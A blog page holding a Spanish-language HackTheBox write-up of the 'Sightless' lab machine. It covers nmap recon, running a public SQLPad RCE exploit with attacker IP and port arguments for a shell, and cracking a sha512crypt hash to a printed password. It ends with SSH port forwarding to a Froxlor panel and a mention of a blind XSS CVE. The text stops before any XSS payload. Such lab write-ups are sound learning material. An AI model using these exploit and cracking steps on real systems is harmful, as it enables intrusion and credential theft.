@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sightless Writeup</title>
+  <link rel="shortcut icon" href="/assets/images/logo.ico" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/assets/css/style.css">
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+</head>
+
+<body>
+
+  <main>
+    
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="/assets/images/my-avatar.png" alt="Oliver Inoa" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Oliver Inoa">Oliver Inoa</h1>
+          <p class="title">Red Team Learner | Cybersecurity Student</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Contacts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <ul class="contacts-list">
+	  <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+
+              <a href="#" class="contact-link" id="phone-request-link">Email available upon request.</a>
+            </div>
+
+          </li>
+
+	<li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="phone-portrait-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Phone</p>
+
+              <a href="#" class="contact-link" id="phone-request-link">Phone available upon request.</a>
+            </div>
+
+          </li>
+ <li class="contact-item">
+
+            <div class="icon-box">
+              <ion-icon name="calendar-outline"></ion-icon>
+            </div>
+
+            <div class="contact-info">
+              <p class="contact-title">Birthday</p>
+
+              <time datetime="2001-01-17">January, 2001</time>
+            </div>
+
+          </li>
+             <li class="contact-item">
+                <div class="icon-box"><ion-icon name="location-outline"></ion-icon></div>
+                <div class="contact-info">
+                    <p class="contact-title">Location</p>
+                    <address>Mao, Valverde, Dominican Republic</address>
+                </div>
+             </li>
+        </ul>
+        <div class="separator"></div>
+        <ul class="social-list">
+          <li class="social-item"> <a href="https://www.linkedin.com/in/oliverinoa/" class="social-link" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a> </li>
+          <li class="social-item"> <a href="https://x.com/Olivalein" class="social-link" target="_blank" rel="noopener noreferrer"> <i class="fab fa-x-twitter"></i> </a> </li>
+          <li class="social-item"> <a href="https://www.instagram.com/oliver_1701/" class="social-link" target="_blank" rel="noopener noreferrer"> <ion-icon name="logo-instagram"></ion-icon> </a> </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      
+<nav class="navbar">
+  <ul class="navbar-list">
+
+    <li class="navbar-item">
+      <a href="/#about" class="navbar-link">About</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#resume" class="navbar-link">Resume</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#portfolio" class="navbar-link">Portfolio</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#blog" class="navbar-link active">Blog</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#certifications" class="navbar-link">Certifications</a>
+    </li>
+
+    <li class="navbar-item">
+      <a href="/#contact" class="navbar-link">Contact</a>
+    </li>
+
+  </ul>
+</nav>
+      <article class="chirpy-post active" data-page="blog-single">
+  
+  <header class="post-header">
+    <h1 class="h2 article-title">Sightless Writeup</h1>
+    <div class="post-meta">
+      <span class="post-date">
+        <i class="far fa-calendar"></i> Feb 12, 2026
+      </span>
+      
+      <span class="post-categories">
+        <i class="far fa-folder"></i> HackTheBox, Linux
+      </span>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <p>Primero un nmap</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">╭─</span> <span class="n">root</span><span class="vi">@exegol</span> <span class="err"></span> <span class="err"></span>  <span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="no">HTB</span><span class="o">/</span><span class="no">Machines</span><span class="o">/</span><span class="no">Sightless</span><span class="o">/</span><span class="n">nmap</span>                                                                                                                                         <span class="err">󰓾</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">231.103</span> <span class="err"></span>  <span class="mo">07</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">15</span> <span class="no">PM</span>
+<span class="err">╰─❯</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">vvv</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">231.103</span> <span class="o">-</span><span class="n">oN</span> <span class="no">Target</span>
+<span class="no">Host</span> <span class="n">discovery</span> <span class="n">disabled</span> <span class="p">(</span><span class="o">-</span><span class="no">Pn</span><span class="p">)</span><span class="o">.</span> <span class="no">All</span> <span class="n">addresses</span> <span class="n">will</span> <span class="n">be</span> <span class="n">marked</span> <span class="s1">'up'</span> <span class="ow">and</span> <span class="nb">scan</span> <span class="n">times</span> <span class="n">may</span> <span class="n">be</span> <span class="n">slower</span><span class="p">.</span>
+
+<span class="nf">&lt;</span><span class="no">SNIP</span><span class="o">&gt;</span>
+
+<span class="no">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="n">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">REASON</span>         <span class="no">VERSION</span>
+<span class="mi">21</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ftp</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+<span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="ss">strings:
+</span><span class="o">|</span>   <span class="no">GenericLines</span><span class="p">:</span>
+<span class="o">|</span>     <span class="mi">220</span> <span class="no">ProFTPD</span> <span class="no">Server</span> <span class="p">(</span><span class="n">sightless</span><span class="p">.</span><span class="nf">htb</span> <span class="no">FTP</span> <span class="no">Server</span><span class="p">)</span> <span class="p">[</span><span class="o">::</span><span class="n">ffff</span><span class="p">:</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">231.103</span><span class="p">]</span>
+<span class="o">|</span>     <span class="no">Invalid</span> <span class="ss">command: </span><span class="n">try</span> <span class="n">being</span> <span class="n">more</span> <span class="n">creative</span>
+<span class="o">|</span><span class="n">_</span>    <span class="no">Invalid</span> <span class="ss">command: </span><span class="n">try</span> <span class="n">being</span> <span class="n">more</span> <span class="n">creative</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="no">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">10</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey:
+</span><span class="o">|</span>   <span class="mi">256</span> <span class="n">c96e3b8fc6032905e5a0ca0090c95c52</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ecdsa</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp256</span> <span class="no">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj</span><span class="o">+</span><span class="n">vKwO9D3RiUUxsnkBNKXp5ql1R</span><span class="o">+</span><span class="n">kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg</span><span class="o">=</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="mi">9</span><span class="n">bde3a27773b1be1195f1611be70e056</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_ssh</span><span class="o">-</span><span class="n">ed25519</span> <span class="no">AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF</span><span class="o">+</span><span class="n">qR5j36q9mO</span><span class="o">+</span><span class="n">bu</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="n">nginx</span> <span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">sightless</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span>
+<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="ss">methods:
+</span><span class="o">|</span><span class="n">_</span>  <span class="no">Supported</span> <span class="no">Methods</span><span class="p">:</span> <span class="no">GET</span> <span class="no">HEAD</span> <span class="no">POST</span> <span class="no">OPTIONS</span>
+<span class="mi">1</span> <span class="n">service</span> <span class="n">unrecognized</span> <span class="n">despite</span> <span class="n">returning</span> <span class="n">data</span><span class="o">.</span> <span class="no">If</span> <span class="n">you</span> <span class="n">know</span> <span class="n">the</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span><span class="p">,</span> <span class="n">please</span> <span class="n">submit</span> <span class="n">the</span> <span class="n">following</span> <span class="n">fingerprint</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="p">.</span><span class="nf">cgi?</span><span class="n">new</span><span class="o">-</span><span class="n">service</span> <span class="p">:</span>
+<span class="no">SF</span><span class="o">-</span><span class="no">Port21</span><span class="o">-</span><span class="no">TCP</span><span class="ss">:V</span><span class="o">=</span><span class="mf">7.93</span><span class="o">%</span><span class="no">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="no">D</span><span class="o">=</span><span class="mi">2</span><span class="o">/</span><span class="mi">10</span><span class="o">%</span><span class="no">Time</span><span class="o">=</span><span class="mi">698</span><span class="no">BBE47</span><span class="o">%</span><span class="no">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="no">Gene</span>
+<span class="no">SF</span><span class="ss">:ricLines</span><span class="p">,</span><span class="no">A3</span><span class="p">,</span><span class="s2">"220</span><span class="se">\x20</span><span class="s2">ProFTPD</span><span class="se">\x20</span><span class="s2">Server</span><span class="se">\x20\(</span><span class="s2">sightless</span><span class="se">\.</span><span class="s2">htb</span><span class="se">\x20</span><span class="s2">FTP</span><span class="se">\x20</span><span class="s2">Ser
+SF:ver</span><span class="se">\)\x20\[</span><span class="s2">::ffff:10</span><span class="se">\.</span><span class="s2">129</span><span class="se">\.</span><span class="s2">231</span><span class="se">\.</span><span class="s2">103</span><span class="se">\]\r\n</span><span class="s2">500</span><span class="se">\x20</span><span class="s2">Invalid</span><span class="se">\x20</span><span class="s2">command:</span><span class="se">\x20</span><span class="s2">
+SF:try</span><span class="se">\x20</span><span class="s2">being</span><span class="se">\x20</span><span class="s2">more</span><span class="se">\x20</span><span class="s2">creative</span><span class="se">\r\n</span><span class="s2">500</span><span class="se">\x20</span><span class="s2">Invalid</span><span class="se">\x20</span><span class="s2">command:</span><span class="se">\x20</span><span class="s2">try</span><span class="se">\x</span><span class="s2">
+SF:20being</span><span class="se">\x20</span><span class="s2">more</span><span class="se">\x20</span><span class="s2">creative</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">);</span>
+<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:linux:linux_kernel</span>
+
+<span class="o">&lt;</span><span class="no">SNIP</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/writeups/Pasted image 20260210192942.png" alt="" /></p>
+
+<p>Luego de una hora intentando entrar a la página (tenía el mtu de tun0 en 1500, al bajarlo a 1200 me permitió entrar) nos encontramos con una página:</p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260210202756.png" alt="" /></p>
+
+<p>La cuál al revisarla y viendo el código fuente de la página nos encontramos con <code class="language-plaintext highlighter-rouge">http://sqlpad.sightless.htb/</code> la cuál agregamos a nuestros archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>  para poder acceder al subdominio de la web.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s2">"10.129.231.103 - sqlpad.sightless.htb"</span> <span class="o">|</span> <span class="n">sudo</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="sr">/etc/</span><span class="n">hosts</span>
+</code></pre></div></div>
+
+<p>Al haber entrado, logramos ver la versión de SQLPad; <code class="language-plaintext highlighter-rouge">6.10.0</code></p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260210203545.png" alt="" /></p>
+
+<p>Haciendo una búsqueda rápida en Google <code class="language-plaintext highlighter-rouge">sqlpad 6.10.0 exploit</code> se encuentra el siguiente repositorio en github: https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944.git el cuál se trata de un exploit de la vulnerabilidad
+<code class="language-plaintext highlighter-rouge">CVE-2022-0944</code> La cuál es un RCE de sqlpad para las versiones 6.10.0 (incluyendo) y anteriores.</p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260210204704.png" alt="" /></p>
+
+<p>Con el exploit obtemos foothold, usándolo de la siguiente manera:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="n">exploit</span><span class="p">.</span><span class="nf">py</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">sqlpad</span><span class="p">.</span><span class="nf">sightless</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span> <span class="vg">$IP</span> <span class="vg">$PORT</span>
+</code></pre></div></div>
+
+<p>y obtenemos web shell.  Mientras enumeramos con <code class="language-plaintext highlighter-rouge">linpeas.sh</code> podemos identificar un hash con el usuario <code class="language-plaintext highlighter-rouge">michael</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::</code></p>
+
+<p>Intentamos crackear con hashcat:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">╭─</span> <span class="n">root</span><span class="vi">@exegol</span> <span class="err"></span> <span class="err"></span>  <span class="o">~</span><span class="sr">/Downloads                                                                                                                                                             󰓾 10.129.231.103   19s   09:04:01 PM
+╰─❯ hashcat --hash-type 1800 --attack-mode 0 hash.txt `fzf-wordlists`
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-haswell-AMD Ryzen 5 3600 6-Core Processor, 6909/</span><span class="mi">13883</span> <span class="no">MB</span> <span class="p">(</span><span class="mi">2048</span> <span class="no">MB</span> <span class="n">allocatable</span><span class="p">),</span> <span class="mi">12</span><span class="no">MCU</span>
+
+<span class="no">Minimum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="ss">kernel: </span><span class="mi">0</span>
+<span class="no">Maximum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="ss">kernel: </span><span class="mi">256</span>
+
+<span class="no">Hashes</span><span class="p">:</span> <span class="mi">1</span> <span class="n">digests</span><span class="p">;</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">digests</span><span class="p">,</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">salts</span>
+<span class="no">Bitmaps</span><span class="p">:</span> <span class="mi">16</span> <span class="n">bits</span><span class="p">,</span> <span class="mi">65536</span> <span class="n">entries</span><span class="p">,</span> <span class="mh">0x0000ffff</span> <span class="n">mask</span><span class="p">,</span> <span class="mi">262144</span> <span class="n">bytes</span><span class="p">,</span> <span class="mi">5</span><span class="o">/</span><span class="mi">13</span> <span class="n">rotates</span>
+<span class="no">Rules</span><span class="p">:</span> <span class="mi">1</span>
+
+<span class="no">Optimizers</span> <span class="ss">applied:
+</span><span class="o">*</span> <span class="no">Zero</span><span class="o">-</span><span class="no">Byte</span>
+<span class="o">*</span> <span class="no">Single</span><span class="o">-</span><span class="no">Hash</span>
+<span class="o">*</span> <span class="no">Single</span><span class="o">-</span><span class="no">Salt</span>
+<span class="o">*</span> <span class="no">Uses</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="no">Bit</span>
+
+<span class="no">ATTENTION</span><span class="o">!</span> <span class="no">Pure</span> <span class="p">(</span><span class="n">unoptimized</span><span class="p">)</span> <span class="n">backend</span> <span class="n">kernels</span> <span class="n">selected</span><span class="o">.</span>
+<span class="no">Pure</span> <span class="n">kernels</span> <span class="n">can</span> <span class="n">crack</span> <span class="n">longer</span> <span class="n">passwords</span><span class="p">,</span> <span class="n">but</span> <span class="n">drastically</span> <span class="n">reduce</span> <span class="n">performance</span><span class="o">.</span>
+<span class="no">If</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">switch</span> <span class="n">to</span> <span class="n">optimized</span> <span class="n">kernels</span><span class="p">,</span> <span class="n">append</span> <span class="o">-</span><span class="no">O</span> <span class="n">to</span> <span class="n">your</span> <span class="n">commandline</span><span class="o">.</span>
+<span class="no">See</span> <span class="n">the</span> <span class="n">above</span> <span class="n">message</span> <span class="n">to</span> <span class="n">find</span> <span class="n">out</span> <span class="n">about</span> <span class="n">the</span> <span class="n">exact</span> <span class="n">limits</span><span class="o">.</span>
+
+<span class="no">Watchdog</span><span class="p">:</span> <span class="no">Hardware</span> <span class="n">monitoring</span> <span class="n">interface</span> <span class="ow">not</span> <span class="n">found</span> <span class="n">on</span> <span class="n">your</span> <span class="nb">system</span><span class="o">.</span>
+<span class="no">Watchdog</span><span class="p">:</span> <span class="no">Temperature</span> <span class="nb">abort</span> <span class="n">trigger</span> <span class="n">disabled</span><span class="o">.</span>
+
+<span class="no">Host</span> <span class="n">memory</span> <span class="n">required</span> <span class="k">for</span> <span class="n">this</span> <span class="ss">attack: </span><span class="mi">0</span> <span class="no">MB</span>
+
+<span class="no">Dictionary</span> <span class="n">cache</span> <span class="ss">built:
+</span><span class="o">*</span> <span class="no">Filename</span><span class="o">..</span><span class="p">:</span> <span class="sr">/opt/</span><span class="n">lists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="nf">txt</span>
+<span class="o">*</span> <span class="no">Passwords</span><span class="o">.</span><span class="p">:</span> <span class="mi">14344391</span>
+<span class="o">*</span> <span class="no">Bytes</span><span class="o">.....</span><span class="p">:</span> <span class="mi">139921497</span>
+<span class="o">*</span> <span class="no">Keyspace</span><span class="o">..</span><span class="p">:</span> <span class="mi">14344384</span>
+<span class="o">*</span> <span class="no">Runtime</span><span class="o">...</span><span class="p">:</span> <span class="mi">1</span> <span class="n">sec</span>
+
+<span class="vg">$6$mG3Cp2VPGY</span><span class="o">.</span><span class="no">FDE8u</span><span class="vg">$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa</span><span class="p">.</span><span class="nf">q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh</span><span class="o">/</span><span class="n">pL2IJD</span><span class="o">/</span><span class="ss">:insaneclownposse</span>
+
+<span class="no">Session</span><span class="o">..........</span><span class="p">:</span> <span class="n">hashcat</span>
+<span class="no">Status</span><span class="o">...........</span><span class="p">:</span> <span class="no">Cracked</span>
+<span class="no">Hash</span><span class="o">.</span><span class="no">Mode</span><span class="o">........</span><span class="p">:</span> <span class="mi">1800</span> <span class="p">(</span><span class="n">sha512crypt</span> <span class="vg">$6$,</span> <span class="no">SHA512</span> <span class="p">(</span><span class="no">Unix</span><span class="p">))</span>
+<span class="no">Hash</span><span class="o">.</span><span class="no">Target</span><span class="o">......</span><span class="p">:</span> <span class="vg">$6$mG3Cp2VPGY</span><span class="o">.</span><span class="no">FDE8u</span><span class="vg">$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa</span><span class="o">....</span><span class="no">L2IJD</span><span class="o">/</span>
+<span class="no">Time</span><span class="o">.</span><span class="no">Started</span><span class="o">.....</span><span class="p">:</span> <span class="no">Tue</span> <span class="no">Feb</span> <span class="mi">10</span> <span class="mi">21</span><span class="p">:</span><span class="mo">05</span><span class="p">:</span><span class="mi">17</span> <span class="mi">2026</span> <span class="p">(</span><span class="mi">18</span> <span class="n">secs</span><span class="p">)</span>
+<span class="no">Time</span><span class="o">.</span><span class="no">Estimated</span><span class="o">...</span><span class="p">:</span> <span class="no">Tue</span> <span class="no">Feb</span> <span class="mi">10</span> <span class="mi">21</span><span class="p">:</span><span class="mo">05</span><span class="p">:</span><span class="mi">35</span> <span class="mi">2026</span> <span class="p">(</span><span class="mi">0</span> <span class="n">secs</span><span class="p">)</span>
+<span class="no">Kernel</span><span class="o">.</span><span class="no">Feature</span><span class="o">...</span><span class="p">:</span> <span class="no">Pure</span> <span class="no">Kernel</span>
+<span class="no">Guess</span><span class="o">.</span><span class="no">Base</span><span class="o">.......</span><span class="p">:</span> <span class="no">File</span> <span class="p">(</span><span class="sr">/opt/</span><span class="n">lists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="nf">txt</span><span class="p">)</span>
+<span class="no">Guess</span><span class="o">.</span><span class="no">Queue</span><span class="o">......</span><span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span>
+<span class="no">Speed</span><span class="o">.</span><span class="c1">#1.........:     3189 H/s (7.62ms) @ Accel:128 Loops:1024 Thr:1 Vec:4</span>
+<span class="no">Recovered</span><span class="o">........</span><span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span> <span class="no">Digests</span> <span class="p">(</span><span class="n">total</span><span class="p">),</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span> <span class="no">Digests</span> <span class="p">(</span><span class="n">new</span><span class="p">)</span>
+<span class="no">Progress</span><span class="o">.........</span><span class="p">:</span> <span class="mi">58496</span><span class="o">/</span><span class="mi">14344384</span> <span class="p">(</span><span class="mf">0.41</span><span class="o">%</span><span class="p">)</span>
+<span class="no">Rejected</span><span class="o">.........</span><span class="p">:</span> <span class="mi">0</span><span class="o">/</span><span class="mi">58496</span> <span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span>
+<span class="no">Restore</span><span class="o">.</span><span class="no">Point</span><span class="o">....</span><span class="p">:</span> <span class="mi">58368</span><span class="o">/</span><span class="mi">14344384</span> <span class="p">(</span><span class="mf">0.41</span><span class="o">%</span><span class="p">)</span>
+<span class="no">Restore</span><span class="o">.</span><span class="no">Sub</span><span class="o">.</span><span class="c1">#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000</span>
+<span class="no">Candidate</span><span class="o">.</span><span class="no">Engine</span><span class="o">.</span><span class="p">:</span> <span class="no">Device</span> <span class="no">Generator</span>
+<span class="no">Candidates</span><span class="o">.</span><span class="c1">#1....: kokokoko -&gt; iloverhys</span>
+
+<span class="no">Started</span><span class="p">:</span> <span class="no">Tue</span> <span class="no">Feb</span> <span class="mi">10</span> <span class="mi">21</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">31</span> <span class="mi">2026</span>
+</code></pre></div></div>
+
+<p>Pudimos identificar el que el hash es SHA-512 por el identificador (valga la redundancia) del mismo, siendo <code class="language-plaintext highlighter-rouge">$6$</code>. La contraseña como se puede ver en el output es <code class="language-plaintext highlighter-rouge">insaneclownposse</code></p>
+
+<p>Al obtener la contraseña para el user <code class="language-plaintext highlighter-rouge">michael</code>, simplemente nos logeamos mediante ssh y ya obtenemos la user.txt</p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260210211453.png" alt="" /></p>
+
+<p>Luego de encontrar la flag del user, procedemos a hacer Privilege escalation, primero revisamos si hay sudoers con <code class="language-plaintext highlighter-rouge">sudo -l</code>, lo cuál observamos que el user michael no puede usar sudo. Luego de ello lo que vemos es los puertos para ver si hay algún servicio en el cuál podemos elevar nuestros privilegios, para ellol usamos el comando <code class="language-plaintext highlighter-rouge">netstat -tunlp</code> y se observan varios puertos abiertos-&gt;</p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260211192532.png" alt="" /></p>
+
+<p>Como ya sabemos, estamos trabajando con una API,  entonces hacemos un curl a cada puerto a ver que nos trae devuelta; Mientras lo hacíamos el comando <code class="language-plaintext highlighter-rouge">curl -s http://127.0.0.1:45501/json</code> nos entregó algo interesante; un subdominio admin y y la aplicación <code class="language-plaintext highlighter-rouge">Froxlor</code> en el puerto 8080:
+<img src="/assets/images/writeups/Pasted image 20260211194758.png" alt="" /></p>
+
+<p>añadimos el subdominio a nuestro <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y entramos. Pero no sin antes hacer un port forwarding; Como vemos el puerto 8080 abierto y en escucha, hacemos un port forwarding mediante ssh desde nuestra máquina host:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">╭─</span> <span class="n">root</span><span class="vi">@exegol</span> <span class="err"></span> <span class="err"></span>  <span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="no">HTB</span><span class="o">/</span><span class="no">Machines</span><span class="o">/</span><span class="no">Sightless</span>                                                                                                                                                     <span class="err"></span>  <span class="mi">3</span><span class="n">m</span> <span class="mi">45</span><span class="n">s</span> <span class="err"></span>  <span class="mo">07</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>
+<span class="err">╰─❯</span> <span class="n">ssh</span> <span class="n">michael</span><span class="vi">@sightless</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="no">L</span> <span class="mi">8081</span><span class="p">:</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8080</span>
+<span class="n">ignoring</span> <span class="n">bad</span> <span class="no">CNAME</span> <span class="s2">"-"</span> <span class="k">for</span> <span class="n">host</span> <span class="s2">"sightless.htb"</span><span class="p">:</span> <span class="n">domain</span> <span class="nb">name</span> <span class="s2">"-"</span> <span class="n">starts</span> <span class="n">with</span> <span class="n">invalid</span> <span class="n">character</span>
+<span class="n">michael</span><span class="vi">@sightless</span><span class="p">.</span><span class="nf">htb</span><span class="err">'</span><span class="n">s</span> <span class="ss">password:
+</span><span class="no">Last</span> <span class="ss">login: </span><span class="no">Wed</span> <span class="no">Feb</span> <span class="mi">11</span> <span class="mi">23</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">08</span> <span class="mi">2026</span> <span class="n">from</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.57</span>
+</code></pre></div></div>
+
+<p>y ya podemos entrar a la página</p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260211195132.png" alt="" /></p>
+
+<p>Al confirmar (nuevamente) que se trata de froxlor, hacemos una búsqueda en google de algún exploit o vulnerabilidad y nos encontramos con la vulnerabilidad <code class="language-plaintext highlighter-rouge">CVE-2024-34070</code>, específicamente este repositorio de github -&gt; https://github.com/advisories/GHSA-x525-54hf-xr53 lo cuál es un <code class="language-plaintext highlighter-rouge">blind XSS</code>.</p>
+
+<p>Para utilizarlo en froxlor debemos abrir burpsuite e interceptar el login, con identidad falsa.</p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260211195853.png" alt="" /></p>
+
